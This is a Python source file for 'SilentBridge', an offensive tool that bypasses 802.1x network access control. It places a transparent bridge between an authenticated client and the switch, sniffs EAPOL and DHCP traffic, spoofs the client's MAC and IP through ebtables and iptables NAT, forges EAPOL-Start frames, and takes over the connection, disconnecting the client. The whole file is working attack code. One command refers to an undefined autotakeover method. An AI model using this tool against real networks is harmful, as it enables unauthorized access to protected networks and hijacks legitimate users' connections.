#!/usr/bin/env python3

import os
import time
import argparse
import subprocess
import netifaces
import sys
import json
from pathlib import Path
from scapy.all import Ether, EAPOL, DHCP, sniff, BOOTP, sendp
from threading import Thread, Event
from queue import Queue

class SilentBridge:
    def __init__(self):
        self.parser = self._create_parser()
        self.args = None
        self.config_file = os.path.expanduser('~/.silentbridge')
        self.stop_sniffing = Event()
        self.packet_queue = Queue()
        self.network_stack = None
        
        # Check if running as root
        if os.geteuid() != 0:
            print("[!] This script must be run as root!")
            sys.exit(1)
            
        # Detect network stack on initialization
        self.network_stack = self.check_network_stack()
        print("[*] Detected network stack:")
        for tool, available in self.network_stack.items():
            print(f"  - {tool}: {'Available' if available else 'Not available'}")
    
    def _create_parser(self):
        parser = argparse.ArgumentParser(description='SilentBridge - 802.1x Bypass Tool')
        
        subparsers = parser.add_subparsers(dest='command', help='Commands')
        
        # Analyze command
        analyze_parser = subparsers.add_parser('analyze', help='Analyze network interfaces and detect configuration')
        analyze_parser.add_argument('--interfaces', nargs='+', required=True, help='List of interfaces to analyze')
        analyze_parser.add_argument('--timeout', type=int, default=30, help='Timeout in seconds for analysis')
        analyze_parser.add_argument('--sidechannel', required=True, help='Side channel interface for management')
        
        # Autotakeover command
        autotakeover_parser = subparsers.add_parser('autotakeover', help='Automatically analyze, bridge and takeover client connection')
        autotakeover_parser.add_argument('--interfaces', nargs=2, required=True, help='Two ethernet interfaces to use')
        autotakeover_parser.add_argument('--sidechannel', required=True, help='Side channel interface for management')
        autotakeover_parser.add_argument('--timeout', type=int, default=30, help='Timeout in seconds for analysis')
        autotakeover_parser.add_argument('--bridge', default='br0', help='Bridge interface name')
        autotakeover_parser.add_argument('--veth-name', default='veth0', help='Name for the virtual ethernet device')
        
        # Create bridge command
        create_parser = subparsers.add_parser('create', help='Create a transparent bridge')
        create_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        create_parser.add_argument('--phy', help='Interface connected to the client (the computer that authenticates itself)')
        create_parser.add_argument('--upstream', help='Upstream interface - The interface connected to the network/router')
        create_parser.add_argument('--sidechannel', required=True, help='Side channel interface for management')
        create_parser.add_argument('--egress-port', type=int, default=22, help='Egress port for side channel')
        create_parser.add_argument('--use-legacy', action='store_true', help='Use legacy iptables instead of nf_tables')
        create_parser.add_argument('--use-stored-config', action='store_true', help='Use stored configuration from previous analysis')
        
        # Destroy bridge command
        destroy_parser = subparsers.add_parser('destroy', help='Destroy a bridge')
        destroy_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        
        # Add interaction command
        interact_parser = subparsers.add_parser('interact', help='Add interaction to bridge')
        interact_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        interact_parser.add_argument('--phy', required=True, help='Interface connected to the client (the computer that authenticates itself)')
        interact_parser.add_argument('--upstream', required=True, help='Upstream interface')
        interact_parser.add_argument('--sidechannel', required=True, help='Side channel interface for management')
        interact_parser.add_argument('--egress-port', type=int, default=22, help='Egress port for side channel')
        interact_parser.add_argument('--client-mac', required=True, help='Client MAC address to impersonate')
        interact_parser.add_argument('--client-ip', required=True, help='Client IP address to impersonate')
        interact_parser.add_argument('--gw-mac', required=True, help='Gateway MAC address')
        interact_parser.add_argument('--use-legacy', action='store_true', help='Use legacy iptables instead of nf_tables')
        
        # Force reauthentication command
        reauth_parser = subparsers.add_parser('reauth', help='Force 802.1x reauthentication')
        reauth_parser.add_argument('--interface', required=True, help='Interface to send EAPOL-Start from')
        reauth_parser.add_argument('--client-mac', required=True, help='Client MAC address to impersonate')
        
        # Takeover command
        takeover_parser = subparsers.add_parser('takeover', help='Take over client connection by creating a virtual interface')
        takeover_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        takeover_parser.add_argument('--phy', required=True, help='Physical interface to remove from bridge')
        takeover_parser.add_argument('--client-mac', required=True, help='Client MAC address to impersonate')
        takeover_parser.add_argument('--client-ip', required=True, help='Client IP address to impersonate')
        takeover_parser.add_argument('--netmask', default='255.255.255.0', help='Network mask for client IP')
        takeover_parser.add_argument('--gateway-ip', required=True, help='Gateway IP address')
        takeover_parser.add_argument('--veth-name', default='veth0', help='Name for the virtual ethernet device')
        
        return parser
    
    def run(self):
        self.args = self.parser.parse_args()
        
        if self.args.command == 'analyze':
            self.analyze_network()
        elif self.args.command == 'create':
            # If using stored config, load it
            if self.args.use_stored_config:
                config = self.load_config()
                if config:
                    if not self.args.phy:
                        self.args.phy = config.get('phy_interface')
                    if not self.args.upstream:
                        self.args.upstream = config.get('upstream_interface')
            self.create_transparent_bridge()
        elif self.args.command == 'destroy':
            self.destroy_bridge()
        elif self.args.command == 'interact':
            self.add_interaction()
        elif self.args.command == 'reauth':
            self.force_reauthentication()
        elif self.args.command == 'takeover':
            self.takeover_client()
        elif self.args.command == 'autotakeover':
            self.autotakeover()
        else:
            self.parser.print_help()
    
    def run_command(self, command, shell=False, ignore_errors=False):
        """Run a shell command and return output"""
        try:
            if shell:
                result = subprocess.run(command, shell=True, check=not ignore_errors, 
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                       universal_newlines=True)
            else:
                result = subprocess.run(command.split(), check=not ignore_errors, 
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                       universal_newlines=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            if not ignore_errors:
                print(f"Command failed: {e}")
                print(f"Error output: {e.stderr}")
            return None
    
    def check_command_exists(self, command):
        """Check if a command exists in the system"""
        try:
            subprocess.run(["which", command], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except subprocess.CalledProcessError:
            return False
    
    def check_interface_exists(self, interface):
        """Check if an interface exists"""
        return os.path.exists(f"/sys/class/net/{interface}")
    
    def check_interface_in_bridge(self, bridge, interface):
        """Check if an interface is already in a bridge"""
        if not os.path.exists(f"/sys/devices/virtual/net/{bridge}/brif"):
            return False
        
        try:
            bridge_interfaces = os.listdir(f"/sys/devices/virtual/net/{bridge}/brif")
            return interface in bridge_interfaces
        except:
            return False
    
    def write_sysfs(self, path, value):
        """Safely write to sysfs files"""
        if not os.path.exists(path):
            print(f"[!] Warning: Path {path} does not exist")
            return False
        
        try:
            # Handle hexadecimal values properly
            if isinstance(value, str) and value.startswith("0x"):
                # Convert hex string to integer
                int_value = int(value, 16)
                value = str(int_value)
            
            with open(path, 'w') as f:
                f.write(str(value))
            return True
        except Exception as e:
            print(f"[!] Warning: Could not write to {path}: {e}")
            return False
    
    def make_bridge_transparent(self, bridge_name):
        """Configure bridge to be completely transparent"""
        print("[*] Making bridge completely transparent...")
        
        # Disable STP on the bridge
        self.run_command(f"brctl stp {bridge_name} off", ignore_errors=True)
        
        # Set bridge ageing time to 0 (don't age out entries)
        self.run_command(f"brctl setageing {bridge_name} 0", ignore_errors=True)
        
        # Disable multicast snooping
        if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_snooping"):
            self.write_sysfs(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_snooping", "0")
        
        # Set forward delay to 0
        self.run_command(f"brctl setfd {bridge_name} 0", ignore_errors=True)
        
        # Enable promiscuous mode on the bridge
        self.run_command(f"ip link set {bridge_name} promisc on", ignore_errors=True)
        
        # Set group_fwd_mask to forward all BPDUs and other reserved addresses
        # Try different methods to set this value
        if os.path.exists(f"/sys/class/net/{bridge_name}/bridge/group_fwd_mask"):
            try:
                # Try direct command first
                self.run_command(f"echo 65535 > /sys/class/net/{bridge_name}/bridge/group_fwd_mask", shell=True, ignore_errors=True)
            except:
                # Then try our write_sysfs method
                self.write_sysfs(f"/sys/class/net/{bridge_name}/bridge/group_fwd_mask", "65535")
        
        # Disable IGMP snooping if available
        if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_igmp_version"):
            try:
                # Try direct command first
                self.run_command(f"echo 0 > /sys/devices/virtual/net/{bridge_name}/bridge/multicast_igmp_version", shell=True, ignore_errors=True)
            except:
                # Then try our write_sysfs method
                self.write_sysfs(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_igmp_version", "0")
        
        # Disable bridge learning
        if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/brif"):
            for iface in os.listdir(f"/sys/devices/virtual/net/{bridge_name}/brif"):
                if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/brif/{iface}/learning"):
                    self.write_sysfs(f"/sys/devices/virtual/net/{bridge_name}/brif/{iface}/learning", "0")
    
    def get_iptables_command(self, command, use_legacy=None):
        """Get the appropriate iptables command (legacy or nf_tables)"""
        if use_legacy is None:
            use_legacy = getattr(self.args, 'use_legacy', False)
        
        if use_legacy:
            if command == "iptables":
                return "iptables-legacy"
            elif command == "ebtables":
                return "ebtables-legacy"
            elif command == "arptables":
                return "arptables-legacy"
        
        return command
    
    def create_transparent_bridge(self):
        """Create a transparent bridge without interaction"""
        print("[*] Creating transparent bridge...")
        
        # Check if interfaces exist
        for iface in [self.args.phy, self.args.upstream, self.args.sidechannel]:
            if not self.check_interface_exists(iface):
                print(f"[!] Interface {iface} does not exist!")
                return
        
        # If NetworkManager is present, unmanage the interfaces
        if self.network_stack['networkmanager']:
            for iface in [self.args.phy, self.args.upstream]:
                self.handle_networkmanager_interface(iface, 'unmanage')
        
        # Check if macchanger is installed
        if not self.check_command_exists("macchanger"):
            print("[!] macchanger is not installed. Please install it with 'apt-get install macchanger'")
            print("[*] Continuing without MAC address change...")
        
        # Get upstream MAC address
        try:
            upstream_mac = netifaces.ifaddresses(self.args.upstream)[netifaces.AF_LINK][0]['addr']
            print(f"[*] Upstream MAC address: {upstream_mac}")
        except (KeyError, IndexError):
            print(f"[!] Could not get MAC address for {self.args.upstream}")
            upstream_mac = None
        
        # Load br_netfilter kernel module
        print("[*] Making sure br_netfilter kernel module is loaded...")
        self.run_command("modprobe br_netfilter", ignore_errors=True)
        
        # Disable IPv6
        print("[*] Disabling IPv6...")
        self.write_sysfs("/proc/sys/net/ipv6/conf/all/disable_ipv6", "1")
        
        # Reset firewall rules
        print("[*] Resetting firewall rules...")
        iptables_cmd = self.get_iptables_command("iptables")
        ebtables_cmd = self.get_iptables_command("ebtables")
        arptables_cmd = self.get_iptables_command("arptables")
        
        self.run_command(f"{iptables_cmd} -F", ignore_errors=True)
        self.run_command(f"{ebtables_cmd} -F", ignore_errors=True)
        self.run_command(f"{arptables_cmd} -F", ignore_errors=True)
        
        # Check if bridge already exists
        if self.check_interface_exists(self.args.bridge):
            print(f"[*] Bridge {self.args.bridge} already exists, skipping creation...")
        else:
            # Create the bridge using appropriate command
            print(f"[*] Creating bridge {self.args.bridge}...")
            if self.network_stack['bridge']:
                self.run_command(f"ip link add name {self.args.bridge} type bridge")
            elif self.network_stack['brctl']:
                self.run_command(f"brctl addbr {self.args.bridge}")
            else:
                print("[!] No bridge creation tools found (ip or brctl)")
                return
        
        # Make the bridge completely transparent
        self.make_bridge_transparent(self.args.bridge)
        
        # Add interfaces to the bridge if not already added
        print("[*] Adding interfaces to the bridge...")
        for iface in [self.args.phy, self.args.upstream]:
            if self.check_interface_in_bridge(self.args.bridge, iface):
                print(f"[*] Interface {iface} is already in bridge {self.args.bridge}, skipping...")
            else:
                if self.network_stack['bridge']:
                    self.run_command(f"ip link set {iface} master {self.args.bridge}", ignore_errors=True)
                else:
                    self.run_command(f"brctl addif {self.args.bridge} {iface}", ignore_errors=True)
        
        # Bring interfaces up using appropriate command
        print("[*] Bringing interfaces up in promiscuous mode...")
        for iface in [self.args.phy, self.args.upstream]:
            if self.network_stack['ip']:
                self.run_command(f"ip link set {iface} up promisc on", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {iface} 0.0.0.0 up promisc", ignore_errors=True)
        
        time.sleep(2)
        
        # Initiate radio silence
        print("[*] Initiating radio silence...")
        try:
            self.run_command(f"{iptables_cmd} -A OUTPUT -o {self.args.sidechannel} -p tcp --dport {self.args.egress_port} -j ACCEPT", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -I INPUT -i {self.args.sidechannel} -m state --state ESTABLISHED,RELATED -j ACCEPT", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -A OUTPUT -o {self.args.sidechannel} -j ACCEPT", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -A OUTPUT -j DROP", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -A OUTPUT -j DROP", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not set up firewall rules: {e}")
        
        # Bring the bridge up
        print("[*] Bringing the bridge up...")
        if self.check_command_exists("macchanger") and upstream_mac:
            self.run_command(f"macchanger -m {upstream_mac} {self.args.bridge}", ignore_errors=True)
        
        if self.network_stack['ip']:
            self.run_command(f"ip link set {self.args.bridge} up promisc on", ignore_errors=True)
        else:
            self.run_command(f"ifconfig {self.args.bridge} 0.0.0.0 up promisc", ignore_errors=True)
        
        # Lift radio silence
        print("[*] Lifting radio silence...")
        try:
            self.run_command(f"{iptables_cmd} -D OUTPUT -j DROP", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -D OUTPUT -j DROP", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not lift radio silence: {e}")
        
        # Reset the links
        print("[*] Resetting the links...")
        self.run_command(f"ethtool -r {self.args.upstream}", ignore_errors=True)
        self.run_command(f"ethtool -r {self.args.phy}", ignore_errors=True)
        
        print("[+] Bridge created successfully!")
    
    def destroy_bridge(self):
        """Destroy the bridge and free all interfaces"""
        print(f"[*] Destroying bridge {self.args.bridge}...")
        
        # Check if the bridge exists
        if not self.check_interface_exists(self.args.bridge):
            print(f"[!] Bridge {self.args.bridge} does not exist!")
            return
        
        try:
            # Get all interfaces in the bridge
            bridge_interfaces = []
            if os.path.exists(f"/sys/devices/virtual/net/{self.args.bridge}/brif"):
                bridge_interfaces = os.listdir(f"/sys/devices/virtual/net/{self.args.bridge}/brif")
                
                # Bring down all interfaces
                print("[*] Bringing down all interfaces...")
                for iface in bridge_interfaces:
                    if self.network_stack['ip']:
                        self.run_command(f"ip link set {iface} down", ignore_errors=True)
                    else:
                        self.run_command(f"ifconfig {iface} down", ignore_errors=True)
            
            # Bring down the bridge
            print("[*] Bringing down the bridge...")
            if self.network_stack['ip']:
                self.run_command(f"ip link set {self.args.bridge} down", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {self.args.bridge} down", ignore_errors=True)
            
            # Remove interfaces from the bridge
            print("[*] Removing interfaces from the bridge...")
            for iface in bridge_interfaces:
                if self.network_stack['bridge']:
                    self.run_command(f"ip link set {iface} nomaster", ignore_errors=True)
                else:
                    self.run_command(f"brctl delif {self.args.bridge} {iface}", ignore_errors=True)
            
            # Delete the bridge
            print("[*] Deleting the bridge...")
            if self.network_stack['bridge']:
                self.run_command(f"ip link delete {self.args.bridge} type bridge", ignore_errors=True)
            else:
                self.run_command(f"brctl delbr {self.args.bridge}", ignore_errors=True)
            
            # Return interfaces to NetworkManager if present
            if self.network_stack['networkmanager']:
                for iface in bridge_interfaces:
                    self.handle_networkmanager_interface(iface, 'manage')
                    # Wait for NetworkManager to take control
                    time.sleep(2)
                    # Bring up the interface with NetworkManager
                    self.run_command(f"nmcli device connect {iface}", ignore_errors=True)
            else:
                # Bring up interfaces using traditional methods
                for iface in bridge_interfaces:
                    if self.network_stack['ip']:
                        self.run_command(f"ip link set {iface} up", ignore_errors=True)
                    else:
                        self.run_command(f"ifconfig {iface} up", ignore_errors=True)
            
            print("[+] Bridge destroyed successfully!")
            
        except Exception as e:
            print(f"[!] Error: {e}")
    
    def add_interaction(self):
        """Add interaction to transparent bridge"""
        print("[*] Adding interaction to bridge...")
        
        # Check if bridge exists
        if not self.check_interface_exists(self.args.bridge):
            print(f"[!] Bridge {self.args.bridge} does not exist!")
            return
        
        # Check if interfaces exist
        for iface in [self.args.phy, self.args.upstream, self.args.sidechannel]:
            if not self.check_interface_exists(iface):
                print(f"[!] Interface {iface} does not exist!")
                return
        
        # Get upstream MAC address
        try:
            upstream_mac = netifaces.ifaddresses(self.args.upstream)[netifaces.AF_LINK][0]['addr']
            print(f"[*] Upstream MAC address: {upstream_mac}")
        except (KeyError, IndexError):
            print(f"[!] Could not get MAC address for {self.args.upstream}")
            upstream_mac = None
            return
        
        # Make sure br_netfilter is loaded
        print("[*] Making sure br_netfilter kernel module is loaded...")
        self.run_command("modprobe br_netfilter", ignore_errors=True)
        
        # Disable IPv6
        print("[*] Disabling IPv6...")
        self.write_sysfs("/proc/sys/net/ipv6/conf/all/disable_ipv6", "1")
        
        # Make sure the bridge is completely transparent
        self.make_bridge_transparent(self.args.bridge)
        
        # Get iptables commands
        iptables_cmd = self.get_iptables_command("iptables")
        ebtables_cmd = self.get_iptables_command("ebtables")
        arptables_cmd = self.get_iptables_command("arptables")
        
        # Configure bridge IP using appropriate method
        print("[*] Configuring bridge IP address...")
        if self.network_stack['networkmanager']:
            # Remove any existing connection
            self.run_command(f"nmcli connection delete {self.args.bridge}", ignore_errors=True)
            
            # Create new bridge connection
            self.run_command(f"nmcli connection add type bridge con-name {self.args.bridge} ifname {self.args.bridge} \
                             ipv4.addresses 169.254.66.66/24 ipv4.method manual", ignore_errors=True)
            
            # Activate the connection
            self.run_command(f"nmcli connection up {self.args.bridge}", ignore_errors=True)
        else:
            # Configure using traditional methods
            if self.network_stack['ip']:
                self.run_command(f"ip addr add 169.254.66.66/24 dev {self.args.bridge}", ignore_errors=True)
                self.run_command(f"ip link set {self.args.bridge} up promisc on", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {self.args.bridge} 169.254.66.66 up promisc", ignore_errors=True)
        
        time.sleep(3)
        
        # Initiate radio silence
        print("[*] Initiating radio silence...")
        try:
            self.run_command(f"{iptables_cmd} -A OUTPUT -o {self.args.sidechannel} -p tcp --dport {self.args.egress_port} -j ACCEPT", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -I INPUT -i {self.args.sidechannel} -m state --state ESTABLISHED,RELATED -j ACCEPT", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -A OUTPUT -o {self.args.sidechannel} -j ACCEPT", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -A OUTPUT -j DROP", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -A OUTPUT -j DROP", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not set up firewall rules: {e}")
        
        time.sleep(3)
        
        # Establish Layer 2 source NAT
        print("[*] Establishing Layer 2 source NAT...")
        try:
            self.run_command(f"{ebtables_cmd} -t nat -A POSTROUTING -s {upstream_mac} -o {self.args.upstream} -j snat --to-src {self.args.client_mac}", ignore_errors=True)
            self.run_command(f"{ebtables_cmd} -t nat -A POSTROUTING -s {upstream_mac} -o {self.args.bridge} -j snat --to-src {self.args.client_mac}", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not set up Layer 2 NAT: {e}")
        
        time.sleep(3)
        
        # Set default gateway and static ARP entry
        print("[*] Setting default gateway and static ARP entry...")
        self.run_command(f"arp -s -i {self.args.bridge} 169.254.66.1 {self.args.gw_mac}", ignore_errors=True)
        
        if self.network_stack['ip']:
            self.run_command(f"ip route add default via 169.254.66.1", ignore_errors=True)
        else:
            self.run_command("route add default gw 169.254.66.1", ignore_errors=True)
        
        time.sleep(3)
        
        # Establish Layer 3 source NAT
        print("[*] Establishing Layer 3 source NAT...")
        try:
            self.run_command(f"{iptables_cmd} -t nat -A POSTROUTING -o {self.args.bridge} -s 169.254.66.66 -p tcp -j SNAT --to {self.args.client_ip}:61000-62000", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -t nat -A POSTROUTING -o {self.args.bridge} -s 169.254.66.66 -p udp -j SNAT --to {self.args.client_ip}:61000-62000", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -t nat -A POSTROUTING -o {self.args.bridge} -s 169.254.66.66 -p icmp -j SNAT --to {self.args.client_ip}", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not set up Layer 3 NAT: {e}")
        
        time.sleep(3)
        
        # Lift radio silence
        print("[*] Lifting radio silence...")
        try:
            self.run_command(f"{iptables_cmd} -D OUTPUT -j DROP", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -D OUTPUT -j DROP", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not lift radio silence: {e}")
        
        print("[+] Interaction added successfully!")
    
    def force_reauthentication(self):
        """Force 802.1x reauthentication by sending EAPOL-Start packet"""
        print(f"[*] Forcing reauthentication for {self.args.client_mac}...")
        
        # Check if interface exists
        if not self.check_interface_exists(self.args.interface):
            print(f"[!] Interface {self.args.interface} does not exist!")
            return
        
        # Send EAPOL-Start packet
        try:
            sendp(Ether(src=self.args.client_mac, dst="01:80:c2:00:00:03")/EAPOL(type=1), 
                  iface=self.args.interface)
            print("[+] EAPOL-Start packet sent successfully!")
        except Exception as e:
            print(f"[!] Error sending EAPOL-Start packet: {e}")
    
    def takeover_client(self):
        """Take over client connection by removing phy interface from bridge and creating a virtual interface"""
        print("[*] Starting client takeover operation...")
        
        try:
            # Check if the bridge exists
            if not self.check_interface_exists(self.args.bridge):
                print(f"[!] Bridge {self.args.bridge} does not exist!")
                return
            
            # Check if the physical interface is in the bridge
            if not self.check_interface_in_bridge(self.args.bridge, self.args.phy):
                print(f"[!] Physical interface {self.args.phy} is not in bridge {self.args.bridge}!")
                return
            
            # Remove the physical interface from the bridge
            print(f"[*] Removing {self.args.phy} from bridge {self.args.bridge}...")
            if self.network_stack['ip']:
                self.run_command(f"ip link set {self.args.phy} down", ignore_errors=True)
                self.run_command(f"ip link set {self.args.phy} nomaster", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {self.args.phy} down", ignore_errors=True)
                self.run_command(f"brctl delif {self.args.bridge} {self.args.phy}", ignore_errors=True)
            
            # Check if the virtual interface already exists and remove it if it does
            if self.check_interface_exists(self.args.veth_name):
                print(f"[*] Virtual interface {self.args.veth_name} already exists, removing it...")
                if self.network_stack['networkmanager']:
                    self.run_command(f"nmcli connection delete {self.args.veth_name}", ignore_errors=True)
                self.run_command(f"ip link delete {self.args.veth_name}", ignore_errors=True)
            
            # Create a virtual ethernet device
            print(f"[*] Creating virtual ethernet device {self.args.veth_name}...")
            self.run_command(f"ip link add {self.args.veth_name} type veth peer name {self.args.veth_name}_peer", ignore_errors=True)
            
            # Add the virtual interface to the bridge
            print(f"[*] Adding {self.args.veth_name}_peer to bridge {self.args.bridge}...")
            if self.network_stack['bridge']:
                self.run_command(f"ip link set {self.args.veth_name}_peer master {self.args.bridge}", ignore_errors=True)
            else:
                self.run_command(f"brctl addif {self.args.bridge} {self.args.veth_name}_peer", ignore_errors=True)
            
            if self.network_stack['ip']:
                self.run_command(f"ip link set {self.args.veth_name}_peer up promisc on", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {self.args.veth_name}_peer up promisc", ignore_errors=True)
            
            # Make sure the bridge is still completely transparent
            self.make_bridge_transparent(self.args.bridge)
            
            # Set the MAC address and configure IP for the virtual interface
            print(f"[*] Configuring {self.args.veth_name}...")
            
            if self.network_stack['networkmanager']:
                # Remove any existing connection
                self.run_command(f"nmcli connection delete {self.args.veth_name}", ignore_errors=True)
                
                # Create new connection with specified MAC and IP
                self.run_command(f"nmcli connection add type ethernet \
                                 con-name {self.args.veth_name} \
                                 ifname {self.args.veth_name} \
                                 ipv4.addresses {self.args.client_ip}/{self.args.netmask} \
                                 ipv4.gateway {self.args.gateway_ip} \
                                 ipv4.method manual \
                                 802-3-ethernet.cloned-mac-address {self.args.client_mac}", ignore_errors=True)
                
                # Activate the connection
                self.run_command(f"nmcli connection up {self.args.veth_name}", ignore_errors=True)
            else:
                # Set MAC address using traditional methods
                if self.network_stack['ip']:
                    self.run_command(f"ip link set {self.args.veth_name} down", ignore_errors=True)
                else:
                    self.run_command(f"ifconfig {self.args.veth_name} down", ignore_errors=True)
                
                if self.check_command_exists("macchanger"):
                    self.run_command(f"macchanger -m {self.args.client_mac} {self.args.veth_name}", ignore_errors=True)
                else:
                    print("[!] macchanger is not installed. Trying to set MAC address using ip command...")
                    self.run_command(f"ip link set dev {self.args.veth_name} address {self.args.client_mac}", ignore_errors=True)
                
                # Configure IP address
                if self.network_stack['ip']:
                    self.run_command(f"ip addr add {self.args.client_ip}/{self.args.netmask} dev {self.args.veth_name}", ignore_errors=True)
                    self.run_command(f"ip link set {self.args.veth_name} up promisc on", ignore_errors=True)
                else:
                    self.run_command(f"ifconfig {self.args.veth_name} {self.args.client_ip} netmask {self.args.netmask} up promisc", ignore_errors=True)
                
                # Add default route
                print(f"[*] Setting default gateway to {self.args.gateway_ip}...")
                # First delete any existing default routes
                self.run_command("ip route del default", ignore_errors=True)
                
                if self.network_stack['ip']:
                    self.run_command(f"ip route add default via {self.args.gateway_ip}", ignore_errors=True)
                else:
                    self.run_command(f"route add default gw {self.args.gateway_ip}", ignore_errors=True)
            
            # Enable IP forwarding
            print("[*] Enabling IP forwarding...")
            self.write_sysfs("/proc/sys/net/ipv4/ip_forward", "1")
            
            # Reset the link
            print("[*] Resetting the link...")
            self.run_command(f"ethtool -r {self.args.veth_name}", ignore_errors=True)
            
            print(f"[+] Takeover complete! The system is now using {self.args.veth_name} with client's MAC and IP.")
            print(f"[+] The client has been disconnected from the network.")
            
        except Exception as e:
            print(f"[!] Error during takeover: {e}")

    def load_config(self):
        """Load stored configuration from file"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            print(f"[!] Error loading configuration: {e}")
        return {}

    def save_config(self, config):
        """Save configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f)
        except Exception as e:
            print(f"[!] Error saving configuration: {e}")

    def packet_callback(self, packet):
        """Callback function for packet analysis"""
        if self.stop_sniffing.is_set():
            return
        
        self.packet_queue.put(packet)

    def analyze_packets(self, timeout):
        """Analyze collected packets to determine network configuration"""
        end_time = time.time() + timeout
        config = {
            'phy_interface': None,
            'upstream_interface': None,
            'client_mac': None,
            'client_ip': None,
            'router_mac': None,
            'router_ip': None
        }
        
        eap_interfaces = set()
        dhcp_interfaces = set()
        dhcp_transactions = {}
        
        while time.time() < end_time:
            try:
                packet = self.packet_queue.get(timeout=1)
                
                # Check for EAP packets
                if EAPOL in packet:
                    eap_interfaces.add(packet.sniffed_on)
                    if packet[EAPOL].type == 1:  # EAPOL-Start
                        config['client_mac'] = packet[Ether].src
                
                # Check for DHCP packets
                if DHCP in packet:
                    dhcp_interfaces.add(packet.sniffed_on)
                    
                    if packet[BOOTP].op == 1:  # DHCP Request
                        transaction_id = packet[BOOTP].xid
                        dhcp_transactions[transaction_id] = {
                            'client_mac': packet[Ether].src,
                            'interface': packet.sniffed_on
                        }
                    
                    elif packet[BOOTP].op == 2:  # DHCP Reply
                        transaction_id = packet[BOOTP].xid
                        if transaction_id in dhcp_transactions:
                            config['client_mac'] = dhcp_transactions[transaction_id]['client_mac']
                            config['client_ip'] = packet[BOOTP].yiaddr
                            config['router_ip'] = packet[BOOTP].siaddr
                            config['router_mac'] = packet[Ether].src
                            config['phy_interface'] = dhcp_transactions[transaction_id]['interface']
                            config['upstream_interface'] = packet.sniffed_on
                
            except Exception:
                continue
            
            # If we have all the information we need, we can stop early
            if all(v is not None for v in config.values()):
                break
        
        # If we couldn't determine interfaces from DHCP, try to use EAP
        if config['phy_interface'] is None and len(eap_interfaces) == 1:
            config['phy_interface'] = list(eap_interfaces)[0]
            # Assume the other interface is upstream
            other_interfaces = set(self.args.interfaces) - {config['phy_interface']}
            if len(other_interfaces) == 1:
                config['upstream_interface'] = list(other_interfaces)[0]
        
        return config

    def analyze_network(self):
        """Analyze network interfaces to determine configuration"""
        print("[*] Starting network analysis...")
        
        # Check if interfaces exist
        for iface in self.args.interfaces:
            if not self.check_interface_exists(iface):
                print(f"[!] Interface {iface} does not exist!")
                return
        
        # Start packet capture on all interfaces
        threads = []
        for iface in self.args.interfaces:
            thread = Thread(target=lambda: sniff(
                iface=iface,
                prn=self.packet_callback,
                store=0,
                stop_filter=lambda _: self.stop_sniffing.is_set()
            ))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        print("[*] Listening for EAP and DHCP packets...")
        print(f"[*] Analysis will timeout in {self.args.timeout} seconds")
        print("[*] Please initiate 802.1x authentication or DHCP request on the client...")
        
        # Analyze packets
        config = self.analyze_packets(self.args.timeout)
        
        # Stop packet capture
        self.stop_sniffing.set()
        for thread in threads:
            thread.join()
        
        # Print results
        print("\n[+] Analysis complete!")
        print("\nDetected Configuration:")
        print("-----------------------")
        if config['phy_interface']:
            print(f"Client Interface (phy): {config['phy_interface']}")
        else:
            print("[!] Could not determine client interface")
        
        if config['upstream_interface']:
            print(f"Upstream Interface: {config['upstream_interface']}")
        else:
            print("[!] Could not determine upstream interface")
        
        if config['client_mac']:
            print(f"Client MAC Address: {config['client_mac']}")
        else:
            print("[!] Could not determine client MAC address")
        
        if config['client_ip']:
            print(f"Client IP Address: {config['client_ip']}")
        else:
            print("[!] Could not determine client IP address")
        
        if config['router_mac']:
            print(f"Router MAC Address: {config['router_mac']}")
        else:
            print("[!] Could not determine router MAC address")
        
        if config['router_ip']:
            print(f"Router IP Address: {config['router_ip']}")
        else:
            print("[!] Could not determine router IP address")
        
        # Save configuration
        if any(v is not None for v in config.values()):
            print("\n[*] Saving configuration...")
            self.save_config(config)
            print(f"[+] Configuration saved to {self.config_file}")
        else:
            print("\n[!] No configuration detected to save")

    def check_network_stack(self):
        """Detect available networking tools and stack"""
        tools = {
            'networkmanager': self.check_command_exists('nmcli'),
            'ip': self.check_command_exists('ip'),
            'ifconfig': self.check_command_exists('ifconfig'),
            'brctl': self.check_command_exists('brctl'),
            'bridge': self.check_command_exists('bridge')  # Modern bridge command
        }
        return tools

